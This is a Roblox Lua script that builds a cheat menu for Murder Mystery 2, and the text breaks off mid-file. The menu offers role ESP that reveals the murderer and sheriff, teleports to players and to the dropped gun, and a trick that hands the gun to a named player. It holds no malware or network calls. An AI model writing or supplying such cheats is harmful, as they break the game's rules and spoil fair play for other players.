--Eclipseeeeeee yesssss-

-- Created with OtS

function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
Frame2 = Instance.new("Frame")
TextButton3 = Instance.new("TextButton")
LocalScript4 = Instance.new("LocalScript")
LocalScript5 = Instance.new("LocalScript")
TextLabel6 = Instance.new("TextLabel")
LocalScript7 = Instance.new("LocalScript")
TextLabel8 = Instance.new("TextLabel")
TextButton9 = Instance.new("TextButton")
LocalScript10 = Instance.new("LocalScript")
LocalScript11 = Instance.new("LocalScript")
TextLabel12 = Instance.new("TextLabel")
LocalScript13 = Instance.new("LocalScript")
TextButton14 = Instance.new("TextButton")
LocalScript15 = Instance.new("LocalScript")
LocalScript16 = Instance.new("LocalScript")
TextButton17 = Instance.new("TextButton")
LocalScript18 = Instance.new("LocalScript")
LocalScript19 = Instance.new("LocalScript")
TextButton20 = Instance.new("TextButton")
LocalScript21 = Instance.new("LocalScript")
LocalScript22 = Instance.new("LocalScript")
TextButton23 = Instance.new("TextButton")
LocalScript24 = Instance.new("LocalScript")
LocalScript25 = Instance.new("LocalScript")
TextBox26 = Instance.new("TextBox")
TextLabel27 = Instance.new("TextLabel")
TextLabel28 = Instance.new("TextLabel")
TextLabel29 = Instance.new("TextLabel")
TextLabel30 = Instance.new("TextLabel")
TextButton31 = Instance.new("TextButton")
LocalScript32 = Instance.new("LocalScript")
LocalScript33 = Instance.new("LocalScript")
TextLabel34 = Instance.new("TextLabel")
TextBox35 = Instance.new("TextBox")
TextButton36 = Instance.new("TextButton")
LocalScript37 = Instance.new("LocalScript")
LocalScript38 = Instance.new("LocalScript")
TextButton39 = Instance.new("TextButton")
LocalScript40 = Instance.new("LocalScript")
LocalScript41 = Instance.new("LocalScript")
TextButton42 = Instance.new("TextButton")
LocalScript43 = Instance.new("LocalScript")
LocalScript44 = Instance.new("LocalScript")
TextBox45 = Instance.new("TextBox")
TextLabel46 = Instance.new("TextLabel")
TextButton47 = Instance.new("TextButton")
LocalScript48 = Instance.new("LocalScript")
LocalScript49 = Instance.new("LocalScript")
Frame50 = Instance.new("Frame")
LocalScript51 = Instance.new("LocalScript")
TextButton52 = Instance.new("TextButton")
LocalScript53 = Instance.new("LocalScript")
LocalScript54 = Instance.new("LocalScript")
TextButton55 = Instance.new("TextButton")
LocalScript56 = Instance.new("LocalScript")
LocalScript57 = Instance.new("LocalScript")
TextLabel58 = Instance.new("TextLabel")
Frame59 = Instance.new("Frame")
TextLabel60 = Instance.new("TextLabel")
ScreenGui61 = Instance.new("ScreenGui")
Frame62 = Instance.new("Frame")
TextButton63 = Instance.new("TextButton")
TextButton64 = Instance.new("TextButton")
TextButton65 = Instance.new("TextButton")
TextButton66 = Instance.new("TextButton")
LocalScript67 = Instance.new("LocalScript")
Folder68 = Instance.new("Folder")
ScreenGui0.Name = "INSANE mm2 Gui"
ScreenGui0.Parent = mas
ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame1.Name = "MainFrame"
Frame1.Parent = ScreenGui0
Frame1.Position = UDim2.new(0.386296213, 0, 0.19184269, 0)
Frame1.Size = UDim2.new(0, 498, 0, 368)
Frame1.BackgroundColor = BrickColor.new("Really black")
Frame1.BackgroundColor3 = Color3.new(0, 0, 0)
Frame1.BorderSizePixel = 0
Frame2.Name = "TopBar"
Frame2.Parent = Frame1
Frame2.Size = UDim2.new(0, 498, 0, 25)
Frame2.BackgroundColor = BrickColor.new("Institutional white")
Frame2.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton3.Name = "MinimizeButton"
TextButton3.Parent = Frame2
TextButton3.Position = UDim2.new(0.947791159, 0, 0, 0)
TextButton3.Size = UDim2.new(0, 26, 0, 25)
TextButton3.BackgroundColor = BrickColor.new("Medium brown")
TextButton3.BackgroundColor3 = Color3.new(0.239216, 0.239216, 0.239216)
TextButton3.BorderSizePixel = 0
TextButton3.Font = Enum.Font.Code
TextButton3.FontSize = Enum.FontSize.Size14
TextButton3.Text = "-"
TextButton3.TextColor = BrickColor.new("Institutional white")
TextButton3.TextColor3 = Color3.new(1, 1, 1)
TextButton3.TextScaled = true
TextButton3.TextSize = 14
TextButton3.TextWrap = true
TextButton3.TextWrapped = true
LocalScript4.Name = "Mini"
LocalScript4.Parent = TextButton3
table.insert(cors,sandbox(LocalScript4,function()
local Main = script.Parent.Parent.Parent
local Mini = script.Parent.Parent.Parent.Parent.MiniFrame

script.Parent.MouseButton1Down:Connect(function()
	Mini.Visible = true
	Main.Visible = false
end)


end))
LocalScript5.Name = "HoverDetector"
LocalScript5.Parent = TextButton3
table.insert(cors,sandbox(LocalScript5,function()
local DialogBox = script.Parent.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Minimize"
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextLabel6.Parent = Frame2
TextLabel6.Position = UDim2.new(0.269076288, 0, 0.0384613052, 0)
TextLabel6.Size = UDim2.new(0, 229, 0, 24)
TextLabel6.BackgroundColor = BrickColor.new("Really black")
TextLabel6.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel6.BackgroundTransparency = 1
TextLabel6.Font = Enum.Font.SourceSans
TextLabel6.FontSize = Enum.FontSize.Size14
TextLabel6.Text = "MM2 Gui"
TextLabel6.TextColor = BrickColor.new("Really red")
TextLabel6.TextColor3 = Color3.new(1, 0, 0.0156863)
TextLabel6.TextScaled = true
TextLabel6.TextSize = 14
TextLabel6.TextWrap = true
TextLabel6.TextWrapped = true
LocalScript7.Name = "DragableUI"
LocalScript7.Parent = Frame1
table.insert(cors,sandbox(LocalScript7,function()
local UserInputService = game:GetService("UserInputService")
local MainFrame = script.Parent
local TopBar = MainFrame:WaitForChild("TopBar")
local Camera = workspace:WaitForChild("Camera")
local DragMousePosition
local FramePosition
local Draggable = false

TopBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		Draggable = true
		DragMousePosition = Vector2.new(input.Position.X, input.Position.Y)
		FramePosition = Vector2.new(MainFrame.Position.X.Scale, MainFrame.Position.Y.Scale)
	end
end)

TopBar.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		Draggable = false
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if Draggable == true then
		local NewPosition = FramePosition + ((Vector2.new(input.Position.X, input.Position.Y) - DragMousePosition) / Camera.ViewportSize)
		MainFrame.Position = UDim2.new(NewPosition.X, 0, NewPosition.Y, 0)
	end
end)
end))
TextLabel8.Name = "ShowDialog"
TextLabel8.Parent = Frame1
TextLabel8.Position = UDim2.new(0, 0, 1, 0)
TextLabel8.Visible = false
TextLabel8.Size = UDim2.new(0, 498, 0, 50)
TextLabel8.BackgroundColor = BrickColor.new("Medium brown")
TextLabel8.BackgroundColor3 = Color3.new(0.258824, 0.258824, 0.258824)
TextLabel8.Font = Enum.Font.SourceSans
TextLabel8.FontSize = Enum.FontSize.Size14
TextLabel8.Text = "None"
TextLabel8.TextColor = BrickColor.new("Really black")
TextLabel8.TextColor3 = Color3.new(0, 0, 0)
TextLabel8.TextScaled = true
TextLabel8.TextSize = 14
TextLabel8.TextStrokeColor3 = Color3.new(1, 1, 1)
TextLabel8.TextStrokeTransparency = 0
TextLabel8.TextWrap = true
TextLabel8.TextWrapped = true
TextButton9.Name = "ExecuteRoleEspVISUAL"
TextButton9.Parent = Frame1
TextButton9.Position = UDim2.new(0.0903614461, 0, 0.163043395, 0)
TextButton9.Size = UDim2.new(0, 99, 0, 36)
TextButton9.BackgroundColor = BrickColor.new("Really black")
TextButton9.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton9.BorderColor = BrickColor.new("Institutional white")
TextButton9.BorderColor3 = Color3.new(1, 1, 1)
TextButton9.Font = Enum.Font.SourceSans
TextButton9.FontSize = Enum.FontSize.Size14
TextButton9.Text = "Execute Visual Role ESP"
TextButton9.TextColor = BrickColor.new("Sand violet metallic")
TextButton9.TextColor3 = Color3.new(0.580392, 0.580392, 0.580392)
TextButton9.TextScaled = true
TextButton9.TextSize = 14
TextButton9.TextWrap = true
TextButton9.TextWrapped = true
LocalScript10.Name = "Execute"
LocalScript10.Parent = TextButton9
table.insert(cors,sandbox(LocalScript10,function()
local Output = script.Parent.Parent.OutputBox
local RoleESP = script.Parent.Parent.Parent.VisualRoleESPGui

script.Parent.MouseButton1Down:Connect(function()
	warn("Executed Visual Role ESP - MM2 UI")
	Output.Text = "   //EXE//: Executed Visual Role ESP"
	
	RoleESP.ESPOff.Visible = true
	RoleESP.ESPon.Visible = true
	RoleESP.Frame.Visible = true
	RoleESP.HIDE.Visible = true
	
	-- Gui to Lua
	-- Version: 3.lemes (my version) xD

	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local ESPon = Instance.new("TextButton")
	local ESPOff = Instance.new("TextButton")
	local HIDE = Instance.new("TextButton")
	local OPEN = Instance.new("TextButton")

	--Properties:

	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	ScreenGui.ResetOnSpawn = false

	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.new(0, 0, 0)
	Frame.Position = UDim2.new(0.166156977, 0, 0, 0)
	Frame.Size = UDim2.new(0, 163, 0, 227)  --comando original (tamanho original): Frame.Size = UDim2.new(0, 163, 0, 454)

	ESPon.Name = "ESPon"
	ESPon.Parent = ScreenGui
	ESPon.BackgroundColor3 = Color3.new(0, 1, 0)
	ESPon.Position = UDim2.new(0.166156977, 0, -4.41335142e-05, 0)
	ESPon.Size = UDim2.new(0, 163, 0, 50)
	ESPon.Font = Enum.Font.SourceSans
	ESPon.Text = "ESP ON (press E)"
	ESPon.TextColor3 = Color3.new(0, 0, 0)
	ESPon.TextScaled = true
	ESPon.TextSize = 14
	ESPon.TextWrapped = true

	ESPOff.Name = "ESPOff"
	ESPOff.Parent = ScreenGui
	ESPOff.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
	ESPOff.Position = UDim2.new(0.166156977, 0, 0.105935514, 0)
	ESPOff.Size = UDim2.new(0, 163, 0, 50)
	ESPOff.Font = Enum.Font.SourceSans
	ESPOff.Text = "ESP OFF (press F)"
	ESPOff.TextColor3 = Color3.new(0, 0, 0)
	ESPOff.TextScaled = true
	ESPOff.TextSize = 14
	ESPOff.TextWrapped = true

	HIDE.Name = "HIDE"
	HIDE.Parent = ScreenGui
	HIDE.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
	HIDE.Position = UDim2.new(0.166156977, 0, 0.211999387, 0)
	HIDE.Size = UDim2.new(0, 163, 0, 56)
	HIDE.Font = Enum.Font.SourceSans
	HIDE.Text = "HIDE"
	HIDE.TextColor3 = Color3.new(0, 0, 0)
	HIDE.TextScaled = true
	HIDE.TextSize = 14
	HIDE.TextWrapped = true

	OPEN.Name = "OPEN"
	OPEN.Parent = ScreenGui
	OPEN.Active = false
	OPEN.BackgroundColor3 = Color3.new(0.0117647, 1, 0.0117647)
	OPEN.Position = UDim2.new(0, 0, 0.0418502204, 0)
	OPEN.Size = UDim2.new(0, 116, 0, 19)
	OPEN.Visible = false
	OPEN.Font = Enum.Font.SourceSans
	OPEN.Text = "OPEN"
	OPEN.TextColor3 = Color3.new(0, 0, 0)
	OPEN.TextScaled = true
	OPEN.TextSize = 14
	OPEN.TextWrapped = true


	-- Scripts:

	local function XVGFY_fake_script() -- ScreenGui.LocalScript
		local script = Instance.new('LocalScript', ScreenGui)

		-- FUNCTIONS
		function murderer()
			for i, v in pairs(game.Players:children()) do
				if  v.Backpack:findFirstChild("Knife") or v.Character:findFirstChild("Knife") then
					return v
				end
			end
		end

		function sherrif()
			for i, v in pairs(game.Players:children()) do
				if  v.Backpack:findFirstChild("Gun") or v.Character:findFirstChild("Gun") then
					return v
				end
			end
		end


		-- ESP ON BUTTON (my new command is ESP ON KEY xD)

		--script.Parent.ESPon.MouseButton1Down:connect(function()
		game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
			if inputObject.KeyCode == Enum.KeyCode.E then

				for i, v in pairs(game.Players:children()) do
					if v.Backpack:findFirstChild("Knife") or v.Character:findFirstChild("Knife") then
						local esp = Instance.new("BoxHandleAdornment")
						esp.Parent = v.Character.Head
						esp.Size = Vector3.new(1,1,1)
						esp.Color3 = Color3.new(255, 0, 0)
						esp.AlwaysOnTop = true
						esp.Adornee = v.Character.Head
						esp.Visible = true
						esp.ZIndex = 2

					elseif v.Backpack:findFirstChild("Gun") or v.Character:findFirstChild("Gun") then
						local esp = Instance.new("BoxHandleAdornment")
						esp.Parent = v.Character.Head
						esp.Size = Vector3.new(1,1,1)
						esp.Color3 = Color3.new(0, 0, 255)
						esp.AlwaysOnTop = true
						esp.Adornee = v.Character.Head
						esp.Visible = true
						esp.ZIndex = 2
					else
						local esp = Instance.new("BoxHandleAdornment")
						esp.Parent = v.Character.Head
						esp.Size = Vector3.new(1,1,1)
						esp.Color3 = Color3.new(0, 255, 0)
						esp.AlwaysOnTop = true
						esp.Adornee = v.Character.Head
						esp.Visible = true
						esp.ZIndex = 2
					end
				end		
			end
		end)
		--)

		-- ESP OFF BUTTON

		--script.Parent.ESPOff.MouseButton1Down:connect(function()
		game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
			if inputObject.KeyCode == Enum.KeyCode.F then
				for i, v in pairs(game.Players:children()) do
					for i, a in pairs(v.Character.Head:children()) do
						if a.ClassName == "BoxHandleAdornment" then
							a:remove()
						end
					end
				end
			end
		end)

		--end)


		-- Hide Button

		script.Parent.HIDE.MouseButton1Down:connect(function()
			for i, v in pairs(script.Parent:children()) do
				if v.Name ~= "OPEN" then
					v.Visible = false
					v.Active = false

				else
					v.Active = true
					v.Visible = true
				end
			end
		end)

		-- Open Button

		script.Parent.OPEN.MouseButton1Down:connect(function()
			for i, v in pairs(script.Parent:children()) do
				if v.Name ~= "OPEN" then
					v.Visible = true
					v.Active = true

				else
					v.Active = false
					v.Visible = false
				end
			end
		end)

	end
	coroutine.wrap(XVGFY_fake_script)()
end)
end))
LocalScript11.Name = "HoverDetector"
LocalScript11.Parent = TextButton9
table.insert(cors,sandbox(LocalScript11,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Loads Up Visual Role ESP Which Will Show A Different Color For Each Role Above Every Player's Head (Red - Murder, Blue - Sherrif, Green - Innocent)."
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextLabel12.Name = "OutputBox"
TextLabel12.Parent = Frame1
TextLabel12.Position = UDim2.new(0.154618472, 0, 0.771739185, 0)
TextLabel12.Size = UDim2.new(0, 344, 0, 70)
TextLabel12.BackgroundColor = BrickColor.new("Black metallic")
TextLabel12.BackgroundColor3 = Color3.new(0.129412, 0.129412, 0.129412)
TextLabel12.Font = Enum.Font.SourceSans
TextLabel12.FontSize = Enum.FontSize.Size14
TextLabel12.Text = ""
TextLabel12.TextColor = BrickColor.new("Lime green")
TextLabel12.TextColor3 = Color3.new(0, 1, 0.0666667)
TextLabel12.TextScaled = true
TextLabel12.TextSize = 14
TextLabel12.TextWrap = true
TextLabel12.TextWrapped = true
LocalScript13.Name = "HoverDetector"
LocalScript13.Parent = TextLabel12
table.insert(cors,sandbox(LocalScript13,function()
local DialogBox = script.Parent.Parent.ShowDialog
local Output = script.Parent

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = ("Shows All The Output For The Command You Last Ran. Current: "..Output.Text)
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextButton14.Name = "ExecuteLoopThroughPlayers"
TextButton14.Parent = Frame1
TextButton14.Position = UDim2.new(0.0903614461, 0, 0.328804255, 0)
TextButton14.Size = UDim2.new(0, 99, 0, 36)
TextButton14.BackgroundColor = BrickColor.new("Really black")
TextButton14.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton14.BorderColor = BrickColor.new("Institutional white")
TextButton14.BorderColor3 = Color3.new(1, 1, 1)
TextButton14.Font = Enum.Font.SourceSans
TextButton14.FontSize = Enum.FontSize.Size14
TextButton14.Text = "Execute Loop Through All Players"
TextButton14.TextColor = BrickColor.new("Sand violet metallic")
TextButton14.TextColor3 = Color3.new(0.580392, 0.580392, 0.580392)
TextButton14.TextScaled = true
TextButton14.TextSize = 14
TextButton14.TextWrap = true
TextButton14.TextWrapped = true
LocalScript15.Name = "Execute"
LocalScript15.Parent = TextButton14
table.insert(cors,sandbox(LocalScript15,function()
local Output = script.Parent.Parent.OutputBox

script.Parent.MouseButton1Down:Connect(function()
	warn("Executed Loop Through Players - MM2 UI")
	Output.Text = "   //EXE//: Executed Loop Through Players"
	
	local player = game.Players.LocalPlayer

	game.Workspace:WaitForChild(player.Name)
	warn("Teleporting..")
	
	for i,child in pairs(game.Players:GetPlayers()) do
		game.Workspace:WaitForChild(child)
		game.Workspace[player.Name].HumanoidRootPart.CFrame = game.Workspace[child.Name].HumanoidRootPart.CFrame
		warn("Teleported To "..child.Name)
		Output.Text = ("//Runner//: Teleported To - "..child.Name)
	end
end)
end))
LocalScript16.Name = "HoverDetector"
LocalScript16.Parent = TextButton14
table.insert(cors,sandbox(LocalScript16,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Teleports To Every Player / Humanoid In The Game Once"
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextButton17.Name = "ExecuteTeleportToGun"
TextButton17.Parent = Frame1
TextButton17.Position = UDim2.new(0.0903614461, 0, 0.480978251, 0)
TextButton17.Size = UDim2.new(0, 99, 0, 37)
TextButton17.BackgroundColor = BrickColor.new("Really black")
TextButton17.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton17.BorderColor = BrickColor.new("Institutional white")
TextButton17.BorderColor3 = Color3.new(1, 1, 1)
TextButton17.Font = Enum.Font.SourceSans
TextButton17.FontSize = Enum.FontSize.Size14
TextButton17.Text = "Execute Teleport To Gun"
TextButton17.TextColor = BrickColor.new("Sand violet metallic")
TextButton17.TextColor3 = Color3.new(0.580392, 0.580392, 0.580392)
TextButton17.TextScaled = true
TextButton17.TextSize = 14
TextButton17.TextWrap = true
TextButton17.TextWrapped = true
LocalScript18.Name = "Execute"
LocalScript18.Parent = TextButton17
table.insert(cors,sandbox(LocalScript18,function()
local Output = script.Parent.Parent.OutputBox

script.Parent.MouseButton1Down:Connect(function()
	warn("Executed Teleport To Gun - MM2 UI")
	Output.Text = "   //EXE//: Executed Teleport To Gun"
	
	local User = game.Players.LocalPlayer

	game.Workspace[User.Name].HumanoidRootPart.CFrame = game.Workspace.GunDrop.CFrame
	warn("Teleported To: game.Workspace.GunDrop")
	Output.Text = "   //Runner//: Teleported To - game.Workspace.GunDrop"
end)
end))
LocalScript19.Name = "HoverDetector"
LocalScript19.Parent = TextButton17
table.insert(cors,sandbox(LocalScript19,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Teleports You To The Gun (ONLY WORKS IF GUN IS DOWN)."
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextButton20.Name = "ExecuteGunLocationESP"
TextButton20.Parent = Frame1
TextButton20.Position = UDim2.new(0.385542154, 0, 0.163043395, 0)
TextButton20.Size = UDim2.new(0, 99, 0, 36)
TextButton20.BackgroundColor = BrickColor.new("Really black")
TextButton20.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton20.BorderColor = BrickColor.new("Institutional white")
TextButton20.BorderColor3 = Color3.new(1, 1, 1)
TextButton20.Font = Enum.Font.SourceSans
TextButton20.FontSize = Enum.FontSize.Size14
TextButton20.Text = "Execute Gun Location ESP  //  OFF"
TextButton20.TextColor = BrickColor.new("Sand violet metallic")
TextButton20.TextColor3 = Color3.new(0.580392, 0.580392, 0.580392)
TextButton20.TextScaled = true
TextButton20.TextSize = 14
TextButton20.TextWrap = true
TextButton20.TextWrapped = true
LocalScript21.Name = "Execute"
LocalScript21.Parent = TextButton20
table.insert(cors,sandbox(LocalScript21,function()
local Output = script.Parent.Parent.OutputBox
local Active = false
local Par = script.Parent

script.Parent.MouseButton1Down:Connect(function()
	local Gun = game.Workspace:WaitForChild("GunDrop")
	
	if Active == false then
		Active = true
		warn("Executed Gun Location ESP/On - MM2 UI")
		Output.Text = "   //EXE//: Executed Gun Location ESP/On"
		Par.Text = "Execute Gun Location ESP  //  ON"
		
		local esp = Instance.new("BoxHandleAdornment")
		esp.Parent = Gun
		esp.Size = Vector3.new(1,1,1)
		esp.Color3 = Color3.new(1, 0.85098, 0)
		esp.AlwaysOnTop = true
		esp.Adornee = Gun
		esp.Visible = true
		esp.ZIndex = 2
		
	elseif Active == true then
		Active = false
		warn("Executed Gun Location ESP/Off - MM2 UI")
		Output.Text = "   //EXE//: Executed Gun Location ESP/Off"
		Par.Text = "Execute Gun Location ESP  //  OFF"

		local GetOldEsp = Gun.BoxHandleAdornment:Destroy()
	end
end)
end))
LocalScript22.Name = "HoverDetector"
LocalScript22.Parent = TextButton20
table.insert(cors,sandbox(LocalScript22,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Loads An ESP That Tracks Down Where The Gun Is (GUN MUST BE DOWN)."
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextButton23.Name = "ExecuteGiveGunToPlayer"
TextButton23.Parent = Frame1
TextButton23.Position = UDim2.new(0.385542125, 0, 0.328804255, 0)
TextButton23.Size = UDim2.new(0, 99, 0, 36)
TextButton23.BackgroundColor = BrickColor.new("Really black")
TextButton23.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton23.BorderColor = BrickColor.new("Institutional white")
TextButton23.BorderColor3 = Color3.new(1, 1, 1)
TextButton23.Font = Enum.Font.SourceSans
TextButton23.FontSize = Enum.FontSize.Size14
TextButton23.Text = "Execute Give Gun To Player"
TextButton23.TextColor = BrickColor.new("Sand violet metallic")
TextButton23.TextColor3 = Color3.new(0.580392, 0.580392, 0.580392)
TextButton23.TextScaled = true
TextButton23.TextSize = 14
TextButton23.TextWrap = true
TextButton23.TextWrapped = true
LocalScript24.Name = "Execute"
LocalScript24.Parent = TextButton23
table.insert(cors,sandbox(LocalScript24,function()
local Output = script.Parent.Parent.OutputBox
local Player = game.Players.LocalPlayer
local GiveTo = script.Parent.Parent.GiveTo

script.Parent.MouseButton1Down:Connect(function()
	Output.Text = "//EXE//: Executed Give Gun To Player"
	warn("Executed Give Gun To Player - MM2 UI")
	
	game.Workspace[Player.Name].HumanoidRootPart.CFrame = game.Workspace.GunDrop.CFrame
	wait(0.5)
	game.Workspace[Player.Name].HumanoidRootPart.CFrame = game.Workspace[GiveTo.Text].HumanoidRootPart.CFrame
	game.Workspace[Player.Name].Humanoid.Health = 0
end)
end))
LocalScript25.Name = "HoverDetector"
LocalScript25.Parent = TextButton23
table.insert(cors,sandbox(LocalScript25,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Teleports You To The Gun Then Teleports You To The Player Selected In The Box And Resets You. This Will Give Them The Gun."
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextBox26.Name = "GiveTo"
TextBox26.Parent = Frame1
TextBox26.Position = UDim2.new(0.385542125, 0, 0.429347813, 0)
TextBox26.Size = UDim2.new(0, 99, 0, 19)
TextBox26.BackgroundColor = BrickColor.new("Really black")
TextBox26.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox26.BorderColor = BrickColor.new("Institutional white")
TextBox26.BorderColor3 = Color3.new(1, 1, 1)
TextBox26.Font = Enum.Font.SourceSans
TextBox26.FontSize = Enum.FontSize.Size14
TextBox26.Text = "Player"
TextBox26.TextColor = BrickColor.new("Institutional white")
TextBox26.TextColor3 = Color3.new(1, 1, 1)
TextBox26.TextScaled = true
TextBox26.TextSize = 14
TextBox26.TextWrap = true
TextBox26.TextWrapped = true
TextBox26.ClearTextOnFocus = false
TextLabel27.Name = "Sherrif"
TextLabel27.Parent = Frame1
TextLabel27.Position = UDim2.new(0.0582329333, 0, 0.671195626, 0)
TextLabel27.Size = UDim2.new(0, 79, 0, 25)
TextLabel27.BackgroundColor = BrickColor.new("Really black")
TextLabel27.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel27.BorderColor = BrickColor.new("Institutional white")
TextLabel27.BorderColor3 = Color3.new(1, 1, 1)
TextLabel27.BorderSizePixel = 0
TextLabel27.Font = Enum.Font.SourceSans
TextLabel27.FontSize = Enum.FontSize.Size14
TextLabel27.Text = "Sherrif:"
TextLabel27.TextColor = BrickColor.new("Really blue")
TextLabel27.TextColor3 = Color3.new(0, 0.180392, 1)
TextLabel27.TextScaled = true
TextLabel27.TextSize = 14
TextLabel27.TextWrap = true
TextLabel27.TextWrapped = true
TextLabel28.Name = "SherrifTelller"
TextLabel28.Parent = Frame1
TextLabel28.Position = UDim2.new(0.216867477, 0, 0.671195626, 0)
TextLabel28.Size = UDim2.new(0, 91, 0, 25)
TextLabel28.BackgroundColor = BrickColor.new("Really black")
TextLabel28.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel28.BorderColor = BrickColor.new("Institutional white")
TextLabel28.BorderColor3 = Color3.new(1, 1, 1)
TextLabel28.Font = Enum.Font.SourceSans
TextLabel28.FontSize = Enum.FontSize.Size14
TextLabel28.Text = "Player"
TextLabel28.TextColor = BrickColor.new("Institutional white")
TextLabel28.TextColor3 = Color3.new(1, 1, 1)
TextLabel28.TextScaled = true
TextLabel28.TextSize = 14
TextLabel28.TextStrokeTransparency = 0
TextLabel28.TextWrap = true
TextLabel28.TextWrapped = true
TextLabel29.Name = "Murder"
TextLabel29.Parent = Frame1
TextLabel29.Position = UDim2.new(0.628514051, 0, 0.671195626, 0)
TextLabel29.Size = UDim2.new(0, 79, 0, 25)
TextLabel29.BackgroundColor = BrickColor.new("Really black")
TextLabel29.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel29.BorderColor = BrickColor.new("Institutional white")
TextLabel29.BorderColor3 = Color3.new(1, 1, 1)
TextLabel29.BorderSizePixel = 0
TextLabel29.Font = Enum.Font.SourceSans
TextLabel29.FontSize = Enum.FontSize.Size14
TextLabel29.Text = "Murder:"
TextLabel29.TextColor = BrickColor.new("Really red")
TextLabel29.TextColor3 = Color3.new(1, 0, 0.0156863)
TextLabel29.TextScaled = true
TextLabel29.TextSize = 14
TextLabel29.TextWrap = true
TextLabel29.TextWrapped = true
TextLabel30.Name = "MurderTelller"
TextLabel30.Parent = Frame1
TextLabel30.Position = UDim2.new(0.787148595, 0, 0.671195626, 0)
TextLabel30.Size = UDim2.new(0, 92, 0, 25)
TextLabel30.BackgroundColor = BrickColor.new("Really black")
TextLabel30.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel30.BorderColor = BrickColor.new("Institutional white")
TextLabel30.BorderColor3 = Color3.new(1, 1, 1)
TextLabel30.Font = Enum.Font.SourceSans
TextLabel30.FontSize = Enum.FontSize.Size14
TextLabel30.Text = "Player"
TextLabel30.TextColor = BrickColor.new("Institutional white")
TextLabel30.TextColor3 = Color3.new(1, 1, 1)
TextLabel30.TextScaled = true
TextLabel30.TextSize = 14
TextLabel30.TextStrokeTransparency = 0
TextLabel30.TextWrap = true
TextLabel30.TextWrapped = true
TextButton31.Name = "ExecuteDetectRolesPR"
TextButton31.Parent = Frame1
TextButton31.Position = UDim2.new(0.429718882, 0, 0.671195626, 0)
TextButton31.Size = UDim2.new(0, 99, 0, 24)
TextButton31.BackgroundColor = BrickColor.new("Lime green")
TextButton31.BackgroundColor3 = Color3.new(0.231373, 1, 0)
TextButton31.BorderColor = BrickColor.new("Institutional white")
TextButton31.BorderColor3 = Color3.new(1, 1, 1)
TextButton31.Font = Enum.Font.SourceSans
TextButton31.FontSize = Enum.FontSize.Size14
TextButton31.Text = "Execute Detect Roles PR"
TextButton31.TextColor = BrickColor.new("Sand violet metallic")
TextButton31.TextColor3 = Color3.new(0.580392, 0.580392, 0.580392)
TextButton31.TextScaled = true
TextButton31.TextSize = 14
TextButton31.TextWrap = true
TextButton31.TextWrapped = true
LocalScript32.Name = "Execute"
LocalScript32.Parent = TextButton31
table.insert(cors,sandbox(LocalScript32,function()
local Output = script.Parent.Parent.OutputBox
local Player = game.Players.LocalPlayer
local GetSherrifBox = script.Parent.Parent.SherrifTelller
local GetMurderBox = script.Parent.Parent.MurderTelller

script.Parent.MouseButton1Down:Connect(function()
	
	Output.Text = "//EXE//: Executed Detect Roles PR"
	warn("Executed Detect Roles PR - MM2 UI")
	
	for i, v in pairs(game.Players:children()) do
		if v.Backpack:findFirstChild("Knife") or v.Character:findFirstChild("Knife") then
			local Murder = v.Name
			GetMurderBox.Text = Murder
		elseif v.Backpack:findFirstChild("Gun") or v.Character:findFirstChild("Gun") then
			local Sherrif = v.Name
			GetSherrifBox.Text = Sherrif
		end
	end	
	
end)

end))
LocalScript33.Name = "HoverDetector"
